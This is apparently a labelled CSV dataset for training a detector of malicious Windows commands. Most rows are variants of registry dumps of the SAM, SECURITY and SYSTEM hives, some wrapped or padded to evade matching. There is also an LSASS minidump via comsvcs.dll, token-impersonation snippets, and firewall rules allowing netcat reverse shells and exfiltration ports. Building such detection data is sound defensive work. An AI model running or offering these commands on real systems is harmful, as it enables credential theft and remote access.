text,label
"cmd.exe /c ""reg export hklm\sam c:\temp\a2ertqdq.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\r9znli7z.dat""",1
reg save hklm\sam c:\windows\temp\uc3qqsi1.save,1
reg  save  hklm\sam  c:\windows\temp\4tyuo9dq.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\zfmtemts.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\7ke18i5l.dat""",1
reg save hklm\sam c:\windows\temp\g2rxd3wf.save,1
reg export hklm\sam c:\windows\temp\on6aa85v.save,1
reg save hklm\system c:\windows\temp\y7ijkjud.save,1
reg save hklm\system c:\windows\temp\mqcdk2lj.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\pvcjo1mz.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\ahvfw0qm.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\glz592de.dat""",1
reg save hklm\security c:\windows\temp\9vub49kl.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\zgho87js.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\x41xoqqv.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\w1lfu908.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\kopxi2uw.dat""",1
"cmd.exe /c ""klist   purge""",3
"cmd.exe /c ""reg save hklm\security c:\temp\g6gaynkz.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\61hve7ko.dat""",1
rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888,2
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337,2
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\vsa27039.save""",1
"netsh advfirewall firewall add rule name=""bad"" action=allow protocol=any port=4444",2
reg save hklm\sam c:\windows\temp\augvowjn.save,1
reg export hklm\system c:\windows\temp\2nc3qlg7.save,1
reg save hklm\system c:\windows\temp\wwp25ghp.save,1
reg save hklm\system c:\windows\temp\0v8d0mr5.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\86h9r21o.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\jyjkp2ro.dat""",1
reg export hklm\sam c:\windows\temp\dhwkiyd1.save,1
reg export hklm\security c:\windows\temp\x1lql82t.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\ovw995dg.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\zzvkae8y.dat""",1
reg save hklm\security c:\windows\temp\aktvxpdq.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\e7s77n5v.dat""""",1
reg save hklm\security c:\windows\temp\kh6ekbtx.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\hp7qftaj.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\qgskbf3w.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\nf42nm87.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\fnatgq55.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\b3y36yww.dat""",1
reg save hklm\system c:\windows\temp\zwaamg4d.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\m1avncag.dat""",1
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\t8cwk98s.save""",1
reg export hklm\security c:\windows\temp\erxa55l5.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\8vfag6eg.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\wz6ri6k7.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\1jmvetna.dat""",1
reg   export   hklm\sam   c:\windows\temp\h81l5xcp.save,1
"cmd.exe /c ""rundll32.exe   c:\windows\system32\comsvcs.dll,   minidump   1234   c:\temp\lsass.dmp   full""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\e8c3h31j.dat""",1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\xcxu079d.save""",1
reg export hklm\system c:\windows\temp\jyp38krm.save,1
rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"powershell -nop -c ""reg export hklm\security c:\temp\mpp449tp.dat""",1
reg export hklm\sam c:\windows\temp\6j8dpssx.save,1
"cmd.exe /c ""reg  export  hklm\sam  c:\windows\temp\msmcrrl4.save""",1
reg save hklm\security c:\windows\temp\jg17d4tn.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"powershell -nop -c ""reg save hklm\security c:\temp\xkgbd6jd.dat""",1
reg save hklm\sam c:\windows\temp\qp83suux.save,1
reg save hklm\sam c:\windows\temp\m2rn2bo4.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\dn9deag6.dat""",1
reg  export  hklm\security  c:\windows\temp\rrc75u6r.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\26bzgzam.dat""",1
"cmd.exe /c ""node   server.js   --port   3000""",0
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\8unkwg4k.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\sam c:\temp\913tg1o6.dat""""",1
"powershell -nop -c ""reg save hklm\security c:\temp\gw614qdb.dat""",1
"cmd.exe /c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\etr047gz.dat""",1
reg save hklm\system c:\windows\temp\5ow1iugy.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\8i0wr2cn.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\nq5250sh.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\szvxlrph.dat""",1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\ndrlcuny.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\me94f11g.dat""",1
"cmd.exe /c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
reg export hklm\sam c:\windows\temp\joo33t2c.save,1
reg export hklm\sam c:\windows\temp\gc0mro19.save,1
reg export hklm\sam c:\windows\temp\f4t2cw6e.save,1
reg save hklm\sam c:\windows\temp\kzob44vj.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\gc827kju.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\eirxrs38.dat""",1
"powershell -nop -c ""get-help  adjusttokenprivileges  -full""",0
reg save hklm\sam c:\windows\temp\2f7bfypp.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\cz00aei2.dat""",1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\58s25od1.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\tughtmap.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\kt4ptm6j.dat""",1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\9byiqcrx.save""",1
reg export hklm\system c:\windows\temp\odcgs0q1.save,1
reg export hklm\system c:\windows\temp\c9tzt1j4.save,1
reg export hklm\sam c:\windows\temp\i2817dxm.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\fwliwvoh.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\otwfz4fh.dat""",1
reg save hklm\sam c:\windows\temp\pyt52c9h.save,1
reg export hklm\system c:\windows\temp\ekt3t550.save,1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\xg3oea6x.dat""",1
reg save hklm\security c:\windows\temp\9r8b1emn.save,1
reg save hklm\sam c:\windows\temp\ksqbloqf.save,1
"wmic   product   get   name,   version",0
reg   save   hklm\sam   c:\windows\temp\te05h9w6.save,1
reg save hklm\security c:\windows\temp\hl2b09of.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\opdq0ysf.dat""",1
reg export hklm\security c:\windows\temp\r5g1dww8.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\7pxd4edj.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\51bl5i8l.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\wvmija3f.dat""",1
reg save hklm\system c:\windows\temp\argpz706.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\9ptwc8st.dat""""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\gqs00c48.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\y12o7mh4.dat""",1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\mlnr4o3p.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\4uti06vo.dat""",1
reg save hklm\sam c:\windows\temp\4pbruixc.save,1
reg export hklm\system c:\windows\temp\tdx3kunm.save,1
reg export hklm\sam c:\windows\temp\nl7feu4s.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\a79eoo1g.dat""",1
reg save hklm\sam c:\windows\temp\kpckuk64.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\gyo7s9cd.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\ntz1x89s.dat""",1
reg save hklm\system c:\windows\temp\z7wykkqt.save,1
reg export hklm\sam c:\windows\temp\tjuim2v2.save,1
reg save hklm\sam c:\windows\temp\05fd62wd.save,1
"cmd.exe /c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: 4444""",2
"cmd.exe /c ""reg export hklm\security c:\temp\hx0cjn2v.dat""",1
reg export hklm\sam c:\windows\temp\jo3zh0yz.save,1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\6xoyf3w6.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\n9io2zjb.dat""",1
reg save hklm\system c:\windows\temp\etj6pb7h.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\95cl1n5e.dat""",1
rule: c2 beacon | app: any | dir: outbound | act: allow | port: 4444,2
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\knis4bl2.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\sifdt8bn.dat""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\sam c:\windows\temp\ewg8ngh4.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\i6jrk2j5.dat""",1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\zk1eyl6d.save""",1
reg save hklm\system c:\windows\temp\bxjtpvie.save,1
reg   save   hklm\security   c:\windows\temp\fqds16zg.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\b5kyno5o.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\security c:\temp\9sx2nfjg.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\wrxykf5d.dat""",1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\sohb2g68.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\owjmx3hr.dat""",1
reg export hklm\sam c:\windows\temp\puk522lz.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\n4nmdovw.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\2qms8qih.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\x0ijek0i.dat""",1
reg export hklm\sam c:\windows\temp\cng5kh44.save,1
reg save hklm\sam c:\windows\temp\9314bl34.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\fg2n3c93.dat""",1
reg export hklm\sam c:\windows\temp\3bww2c27.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\k5oxqx1l.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\0qorjoen.dat""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\kosuzwk3.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\sam c:\temp\rbysr7nb.dat""""",1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\yp772apm.save""",1
"powershell -nop -c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"cmd.exe /c ""reg export hklm\security c:\temp\8dcuu7z4.dat""",1
ipconfig   /all,0
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\exbkaze7.save""",1
reg export hklm\system c:\windows\temp\of868d6v.save,1
reg export hklm\sam c:\windows\temp\5wo355dd.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\4s52uu05.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\tjbj4o1y.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\t512mv4g.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\96anxrh3.dat""",1
reg save hklm\sam c:\windows\temp\eya29ysh.save,1
reg export hklm\security c:\windows\temp\jonr9npu.save,1
reg export hklm\sam c:\windows\temp\z5s1iwol.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\wfz3vb3k.dat""",1
reg save hklm\system c:\windows\temp\pe5l9ubl.save,1
reg export hklm\sam c:\windows\temp\2vq7ruky.save,1
reg save hklm\system c:\windows\temp\xqm0luu8.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\5s4vjdei.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\axr72yst.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\5tioa2em.dat""",1
reg save hklm\system c:\windows\temp\mgy2kyde.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\5zzoha8y.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\2e8ox68e.dat""",1
reg save hklm\system c:\windows\temp\vl0z82x4.save,1
reg  export  hklm\system  c:\windows\temp\mrfnsvka.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\jncej0s2.dat""",1
reg save hklm\sam c:\windows\temp\a04cyppb.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\oo0x2kbd.dat""",1
reg export hklm\system c:\windows\temp\i924ixls.save,1
reg export hklm\system c:\windows\temp\vzkg2vlo.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\tb7e1g8w.dat""",1
reg export hklm\system c:\windows\temp\pg9ghx8c.save,1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\93g3dby4.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\b6fg7xln.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\j2cctmgc.dat""",1
reg export hklm\security c:\windows\temp\7vq1puba.save,1
reg export hklm\security c:\windows\temp\9hfglqg3.save,1
reg export hklm\system c:\windows\temp\mp4c2dbn.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\wjgi836n.dat""",1
"powershell -nop -c ""backup-utility  write  hklm\software  to  c:\backups\config.dat""",0
get-help adjusttokenprivileges -full,0
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\ay9u3bst.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\j06l6ycc.dat""",1
reg export hklm\security c:\windows\temp\zvd3202l.save,1
reg export hklm\security c:\windows\temp\ob9vqw4a.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\2d3lzgx8.dat""",1
reg export hklm\security c:\windows\temp\e7c4gyil.save,1
reg save hklm\sam c:\windows\temp\2ak8omtk.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\cqbwqwi2.dat""",1
reg export hklm\sam c:\windows\temp\0stvk81i.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\vd43kd1b.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\b3h9pcri.dat""",1
reg save hklm\security c:\windows\temp\b5tvxf8i.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\qw8itlaz.dat""",1
reg save hklm\security c:\windows\temp\upynaktd.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\fa1jhh31.dat""",1
reg export hklm\security c:\windows\temp\piavydxi.save,1
rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"cmd.exe /c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg save hklm\system c:\windows\temp\vi4wjosg.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\e5l23225.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\63kko3nz.dat""",1
reg save hklm\system c:\windows\temp\1ty1nus5.save,1
reg save hklm\security c:\windows\temp\z7z1lnrs.save,1
reg save hklm\security c:\windows\temp\gb0dzown.save,1
reg export hklm\security c:\windows\temp\5wtrxrxy.save,1
reg save hklm\security c:\windows\temp\4ftulxze.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\51gyy6ai.save""",1
reg export hklm\sam c:\windows\temp\uf62yizk.save,1
rule: reverse shell | app: any | dir: outbound | act: allow | port: 4444,2
"cmd.exe /c ""reg export hklm\security c:\temp\840ohds4.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\dlt9hjal.dat""",1
reg export hklm\system c:\windows\temp\6h42omwo.save,1
reg export hklm\security c:\windows\temp\zpbxoxmf.save,1
"cmd.exe /c ""reg  query  hkcu\console""",0
"cmd.exe /c ""reg save hklm\security c:\temp\hcey83vj.dat""",1
"powershell -nop -c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\toy45xzv.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\osv1x8x6.save""",1
reg save hklm\sam c:\windows\temp\ue7yrm4p.save,1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\i25ko4l2.dat""",1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"cmd.exe /c ""reg export hklm\sam c:\temp\8ienatpf.dat""",1
reg save hklm\system c:\windows\temp\3xrzf52d.save,1
reg export hklm\sam c:\windows\temp\2ay5pi68.save,1
reg save hklm\security c:\windows\temp\sv2o5rp3.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")] extern bool openprocesstoken(...)""",3
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\0wjzmuxr.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ptux18bq.dat""",1
reg export hklm\system c:\windows\temp\u85atozd.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\fnztjden.dat""",1
"powershell -nop -c ""backup-utility   save   registry   config""",0
"powershell -nop -c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\system c:\windows\temp\28q2zpzd.save,1
"cmd.exe /c ""$a   =   [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444,2
reg save hklm\security c:\windows\temp\oqbjhgol.save,1
reg export hklm\sam c:\windows\temp\whrlq4ua.save,1
reg save hklm\sam c:\windows\temp\a1cltjvl.save,1
reg   export   hklm\system   c:\windows\temp\zoq7crwf.save,1
reg export hklm\security c:\windows\temp\l4cw4b4i.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\jyi58m7c.dat""",1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\c1o1etcn.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\26md179f.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\624eezng.dat""""",1
reg save hklm\system c:\windows\temp\30jg08uy.save,1
reg save hklm\sam c:\windows\temp\il23ma75.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\rdxyb2lq.dat""",1
reg save hklm\system c:\windows\temp\fbyeo57u.save,1
reg save hklm\security c:\windows\temp\08nkw8jh.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\83glwqds.dat""",1
rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"cmd.exe /c ""reg export hklm\security c:\temp\siyp3z17.dat""",1
reg save hklm\system c:\windows\temp\z4euw2kn.save,1
reg save hklm\sam c:\windows\temp\g1zu0fmq.save,1
reg save hklm\security c:\windows\temp\zpqim6r7.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\zyce0ixy.dat""",1
reg   export   hklm\security   c:\windows\temp\x7ghv39h.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\yube23t1.dat""",1
reg export hklm\system c:\windows\temp\mhk6f3lt.save,1
node  server.js  --port  3000,0
"cmd.exe /c ""reg export hklm\sam c:\temp\y6dpp2ga.dat""",1
reg export hklm\sam c:\windows\temp\7ezl32ie.save,1
"powershell -nop -c ""rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444,2
"powershell -nop -c ""reg save hklm\security c:\temp\dulmgbpf.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\uc7pa9db.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\x5vw32qu.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\b2cue1ud.dat""",1
reg export hklm\security c:\windows\temp\e6q4w4eq.save,1
"powershell -nop -c ""$a = [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
reg save hklm\system c:\windows\temp\1qkv9era.save,1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\security c:\temp\3gj2ekw8.dat""""",1
reg export hklm\system c:\windows\temp\vv6yakx8.save,1
reg save hklm\system c:\windows\temp\21emzvys.save,1
reg save hklm\sam c:\windows\temp\44l25c6d.save,1
"cmd.exe /c ""whoami   /groups""",0
"powershell -nop -c ""[dllimport(""advapi32.dll"")]   extern   bool   duplicatetokenex(...)""",3
"powershell -nop -c ""reg save hklm\security c:\temp\rw30wfn5.dat""",1
reg save hklm\system c:\windows\temp\d538wd7j.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\y5sutudq.save""",1
reg save hklm\system c:\windows\temp\72kpa821.save,1
reg export hklm\security c:\windows\temp\rx9gqwuc.save,1
rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
reg export hklm\sam c:\windows\temp\ovr2cieh.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\d4onq5ul.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\4itql0cp.dat""",1
reg export hklm\security c:\windows\temp\zojmz6oo.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\zr06bab9.dat""",1
reg  export  hklm\system  c:\windows\temp\ithdgl9g.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\3iykyzx2.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\1oqlol6y.dat""",1
reg save hklm\system c:\windows\temp\8s4fi2am.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\gnxo4dp0.dat""",1
reg export hklm\security c:\windows\temp\wz4fr5qm.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\hhoalhij.save""",1
reg export hklm\security c:\windows\temp\utwrh88e.save,1
reg export hklm\security c:\windows\temp\9izr7tif.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\kah813nm.dat""",1
reg save hklm\security c:\windows\temp\1ccoaqyw.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\wtycygt1.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\91pwehuw.dat""",1
reg export hklm\security c:\windows\temp\hzzhtzbc.save,1
reg save hklm\security c:\windows\temp\22fdie7u.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\i761kgtn.dat""",1
reg export hklm\security c:\windows\temp\qyn1xsx2.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ftbvzogh.dat""",1
reg export hklm\security c:\windows\temp\oa3ta7hw.save,1
reg  export  hklm\system  c:\windows\temp\w7dwoc57.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\gbnv26ji.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\frg2fv8y.dat""",1
reg export hklm\security c:\windows\temp\rhzoca9e.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\2yglcsbr.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\w3pkew43.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\8xm5a5zo.dat""",1
reg save hklm\security c:\windows\temp\fizrattw.save,1
reg  save  hklm\security  c:\windows\temp\x284d4sa.save,1
"powershell -nop -c ""reg   export   hklm\system   c:\windows\temp\ios7ubnx.save""",1
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""reg save hklm\security c:\temp\lzwzfl2g.dat""",1
"cmd.exe /c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 1337""",2
reg save hklm\security c:\windows\temp\rokodqe6.save,1
reg export hklm\system c:\windows\temp\wrlli99j.save,1
reg save hklm\system c:\windows\temp\61rygzxa.save,1
reg save hklm\system c:\windows\temp\lazyaf29.save,1
reg save hklm\security c:\windows\temp\xo6a0y9h.save,1
reg save hklm\system c:\windows\temp\avc3lg38.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\edy288el.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\zbjys8b5.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\tgm76ll5.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\4af2rgif.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\f8hu9d94.dat""",1
reg save hklm\security c:\windows\temp\s7mg66ld.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\t3728v8z.dat""",1
reg export hklm\sam c:\windows\temp\hlgj9zqf.save,1
reg export hklm\sam c:\windows\temp\q48y07jd.save,1
reg export hklm\sam c:\windows\temp\x02hj9dd.save,1
"powershell -nop -c ""netsh   dump   >   netconfig.txt""",0
"cmd.exe /c ""powershell -nop -c ""reg export hklm\sam c:\temp\poy1z3uu.dat""""",1
"cmd.exe /c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg save hklm\system c:\windows\temp\81w94ngz.save,1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\0ow6yg8b.dat""",1
reg save hklm\sam c:\windows\temp\a9mvmnza.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\j2jsxkuw.dat""",1
reg export hklm\sam c:\windows\temp\4dpicsy8.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\tg831fsw.dat""",1
"powershell -nop -c ""klist   purge""",3
"cmd.exe /c ""powershell -nop -c ""reg save hklm\security c:\temp\9axk22j1.dat""""",1
reg export hklm\security c:\windows\temp\df981r5e.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\pg3t5yc9.dat""""",1
reg export hklm\security c:\windows\temp\38zzdk9t.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\m6e93sof.save""",1
reg save hklm\sam c:\windows\temp\iucf52y9.save,1
reg export hklm\system c:\windows\temp\6v9yn0cy.save,1
reg save hklm\system c:\windows\temp\kh9as5np.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\263pjoqc.dat""",1
